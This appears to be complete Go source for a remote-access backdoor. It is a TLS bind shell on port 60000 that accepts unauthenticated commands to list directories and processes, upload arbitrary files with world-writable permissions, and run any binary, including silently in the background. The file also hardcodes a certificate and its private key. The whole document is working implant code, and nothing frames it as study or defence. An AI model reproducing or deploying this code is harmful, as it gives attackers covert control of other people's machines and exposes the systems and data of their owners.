package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

var certPEM = []byte(`-----BEGIN CERTIFICATE-----
MIIFjzCCA3egAwIBAgIUFnwY1e3Y0xUWxfAC53vhhrE+UqcwDQYJKoZIhvcNAQEL
BQAwVzELMAkGA1UEBhMCVVMxEzARBgNVBAgMCkNhbGlmb3JuaWExEDAOBgNVBAcM
B09ha2xhbmQxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0y
NDExMDIxODAxMzVaFw0yNTExMDIxODAxMzVaMFcxCzAJBgNVBAYTAlVTMRMwEQYD
VQQIDApDYWxpZm9ybmlhMRAwDgYDVQQHDAdPYWtsYW5kMSEwHwYDVQQKDBhJbnRl
cm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIK
AoICAQClhnlFTlaiGEFCRDz6Y3XU7VqdGNepb5oZ9xnY2F5VgAPDGv8lRxV4nUBf
NaxlphC2djPuJNTrs707vd2s0QbL6VgqMQ3TiGJGN8FaSf13yVDjZXl52Tvxi4nz
j5UQ3jYodYTwnFCkKexiKnEgBp2vMCy8SgKgA/SLIA3JjNs9Zrh9CVfgePKE1xC3
lMEx2UrLoTmw54PhYInMsTwqie5/imdRteIeQz5mbY7OwHL73vA3LT0irWOtGE9K
EQakh1sVb2ae91+5fLo+1kUCrpJXcI3j+cvoOHY5UwZQn9uD2AmV4GWYMmM3wdye
3kAv/fQQFfCtOf3B58XryNEWhtdCbwCK8Mp9LpCnBpSBpQ/Xg0w4ZSwZDPRsjdLM
MSgbPRRX5hZiSK3U87vTwnl+Ofv4SAWmsYDEAukiNr6iMz2g0hLrPklhK+RiqV+r
JkTTlsuE6lgyVtDk1YbArFZA1Hb2lxfQuXc5nvc3RNWZrf0E3SW+TojJNveEVQru
Rt53S/8cPVosaOUBnvcBivMHV+Cg23mjEt8+SlhxrjGB5ETw/N5QKBFsb1qvPy+c
tM4yI1M6HgB6px7Fpo3w4D0nVCs3i9HqRmXEMYGBUOLNcbbcYfcr/dmOHO0LQ2Cr
QeM88v3TBuxdrfz1DW7V2NFZD9C09aNhHsKmyDyN/FWXQ1lleQIDAQABo1MwUTAd
BgNVHQ4EFgQUlzGaJHpFctMEW5LLlyABVgT+mWgwHwYDVR0jBBgwFoAUlzGaJHpF
ctMEW5LLlyABVgT+mWgwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC
AgEAj8r/n9M/PerTYeLY/22AXwsQObNqtAMsd3AN9bueDQbPUgbXuQnfCVVMCdke
tce+QQY3lPjwGU3hYXC14FXNO5CCAeyayjv/7cswPUEwYwCv1l47wByrPbEx7itQ
YRbqmtPvPnZILJJyOceVjyVQw50CpFKsjxu1jQHcO02TWtr2a0URCxMVhhr9GXgz
MJeDVM+vRYoNtX52JBrWW4gtPx+occC7DPHoNxb+fxVcp5I2Sy9IzGXY8lCR/LoC
GNVT+HRHbrZ7I67YIYbXZ14h3Wkns4h3uhevQR1jwuGdgFC9iRZLmid5Y+0rO10V
4taBsong/py2QjVS1xg2Pu6N8iWAjXILrq6TSjYy7rEr3myeCm/Vc9AmUe95RTPy
NkVsqZWmP3nkZ+foamXYYi55nYs35anzjBctE2SiCy9lbkCiYUKahzyCn6IIoOE+
039fGW1h14sZHxyIWZWCjVhq78zHC0/yECdNKbNTdwM8KKMZnrYdyPxUXL0m036h
QI59vByfNQpCNQ5kjliUQ44Dru1qn+au+prISFKzXEVDNqZCZs4giFl833hbrqov
7O3SnnJsswW1ImIb/t3v5FZpC+EYZrz80tsrnQaq4GzVDvTgCZY/N/Pe+JWuX37t
XvVtRy0XVuNF96nHAgyq3IAvqqT6UhsK/oNfqeXAFzylptw=
-----END CERTIFICATE-----`)

var keyPEM = []byte(`-----BEGIN PRIVATE KEY-----
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
spzy5kvUr2JZhslIygFW+1I+SyCO4g==
-----END PRIVATE KEY-----`)

func get_proc_listing() []string {
	dir, err := os.Open("/proc")
	if err != nil {
		return nil
	}
	defer dir.Close()

	files, err := dir.Readdir(-1)
	if err != nil {
		return nil
	}
	var filenames []string
	for _, file := range files {
		filenames = append(filenames, file.Name())
	}
	return filenames

}

func read_proc_file(file_name string) string {
	data, err := os.ReadFile(file_name)
	if err != nil {
		return ""
	}
	content := strings.ReplaceAll(string(data), "\x00", " ") // replace \x00 with space
	return content
}

func get_ps(conn net.Conn) {
	proc_files := get_proc_listing()

	var process_list []string

	for _, name := range proc_files {
		pid, err := strconv.Atoi(name)
		if err != nil {
			continue
		} else {
			cmdline_path := fmt.Sprintf("/proc/%d/cmdline", pid)
			ppid_path := fmt.Sprintf("/proc/%d/status", pid)

			var cmdline_file_contents string
			if len(read_proc_file(cmdline_path)) != 0 {
				cmdline_file_contents = read_proc_file(cmdline_path)
			} else {
				cmdline_path := fmt.Sprintf("/proc/%d/status", pid)
				cmdline_file_contents = read_proc_file(cmdline_path)

				cmdline_file_lines := strings.Split(cmdline_file_contents, "\n")

				for _, line := range cmdline_file_lines {
					if strings.HasPrefix(line, "Name:") {
						parts := strings.Fields(line)
						if len(parts) == 2 {
							cmd_line_formatted := fmt.Sprintf("%v%v%v", "[", parts[1], "]")
							cmdline_file_contents = cmd_line_formatted
						} else {
							cmdline_file_contents = "?"
						}
						break
					}
				}
			}

			ppid_file_contents := read_proc_file(ppid_path)
			ppid_lines := strings.Split(ppid_file_contents, "\n")

			var ppid_value string

			for _, line := range ppid_lines {
				if strings.HasPrefix(line, "PPid:") {
					parts := strings.Fields(line)
					if len(parts) == 2 {
						ppid_value = parts[1]
					} else {
						ppid_value = "?"
					}
					break
				}
			}
			process_list = append(process_list, fmt.Sprintf("%-7d  %-7s  %s", pid, ppid_value, cmdline_file_contents))
		}
	}
	for _, value := range process_list {
		fmt.Fprintf(conn, "%v\n", value)
	}
	fmt.Fprintf(conn, "__END__\n")
}

func listDirectories(conn net.Conn, path string) {

	dir, err := os.Open(path)
	if err != nil {
		fmt.Fprintf(conn, "[!] %v\n__END__\n", err)
		return
	}
	defer dir.Close()

	files, err := dir.Readdir(-1)
	if err != nil {
		fmt.Fprintf(conn, "[!] %v\n__END__\n", err)
	}
	for _, file := range files {
		line := fmt.Sprintf("%-15s %-22v %-10d %-20s\n", file.Mode(), file.ModTime().UTC().Format(time.RFC3339), file.Size(), file.Name())
		fmt.Fprintf(conn, "%v", line)
	}
	fmt.Fprintf(conn, "__END__\n")
}

func uploadFile(conn net.Conn, remotePath string, fSize string) {
	fileSize, err := strconv.ParseInt(fSize, 10, 64)
	if err != nil {
		fmt.Fprintf(conn, "[!] Invalid file size\n__END__\n")
		return
	}

	file, err := os.OpenFile(remotePath, os.O_CREATE|os.O_WRONLY, 0777)
	if err != nil {
		fmt.Fprintf(conn, "[!] Error creating file at: %v\n__END__\n", err)
		return
	}
	defer file.Close()

	_, err = conn.Write([]byte{'1'})
	if err != nil {
		return
	}

	buffer := make([]byte, 4096)
	totalBytes := int64(0)

	for totalBytes < fileSize {
		n, err := conn.Read(buffer)
		if n > 0 {
			_, write_err := file.Write(buffer[:n])
			if write_err != nil {
				fmt.Fprintf(conn, "[!] Error writing to file: %v\n__END__\n", write_err)
				return
			}
			totalBytes += int64(n)
		}

		if err != nil {
			fmt.Fprintf(conn, "[!] Error reading from connection: %v\n__END__\n", err)
			return
		}
	}

	if totalBytes == fileSize {
		fmt.Fprintf(conn, "[+] Success writing data to: %v\n__END__\n", remotePath)

	} else {
		fmt.Fprintf(conn, "[!] File size mismatch: expected %d bytes, recieved %d bytes\n__END__\n", fileSize, totalBytes)
	}
}

func execBinary(conn net.Conn, binPath string, args []string, background bool) {
	binary := exec.Command(binPath, args...)

	var output bytes.Buffer

	if background {
		binary.Stdin = nil
		binary.Stdout, _ = os.Open(os.DevNull)
		binary.Stderr, _ = os.Open(os.DevNull)
	} else {
		binary.Stdin = nil
		binary.Stdout = &output
		binary.Stderr = &output
	}

	err := binary.Start()
	if err != nil {
		fmt.Fprintf(conn, "%v\n__END__\n", err)
		return
	}

	if background {
		fmt.Fprintf(conn, "%s", "[+] Binary executed successfully in background\n__END__\n")
		return
	}

	err = binary.Wait()
	if err != nil {
		fmt.Fprintf(conn, "%v\n__END__\n", err)
		return
	}

	fmt.Fprintf(conn, "%v", output.String())
	fmt.Fprintf(conn, "%s", "__END__\n")

}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	scanner := bufio.NewScanner(conn)

	for scanner.Scan() {
		command := scanner.Text()
		commandParts := strings.Fields(command)
		commandAction := commandParts[0]

		if commandAction == "ls" {
			path := strings.Join(commandParts[1:], " ")
			listDirectories(conn, path)
		} else if commandAction == "ps" {
			get_ps(conn)
		} else if commandAction == "upload" {
			remotePath := commandParts[1]
			fileSize := commandParts[2]
			uploadFile(conn, remotePath, fileSize)
		} else if commandAction == "exec" && commandParts[1] == "-b" {
			binPath := commandParts[2]
			args := commandParts[3:]
			execBinary(conn, binPath, args, true)
		} else if commandAction == "exec" {
			binPath := commandParts[1]
			args := commandParts[2:]
			execBinary(conn, binPath, args, false)

		}
	}
}

func main() {

	tlscert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		fmt.Printf("[!] Failed to load key pair: %v\r\n", err)
	}

	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{tlscert},
		InsecureSkipVerify: true,
	}

	ln, err := tls.Listen("tcp", ":60000", tlsConfig)
	if err != nil {
		fmt.Printf("[!] Failed to listen: %v\r\n", err)
	}
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Printf("[!] Error accepting conn: %v\r\n", err)
			continue
		}

		go handleConnection(conn)
	}

}
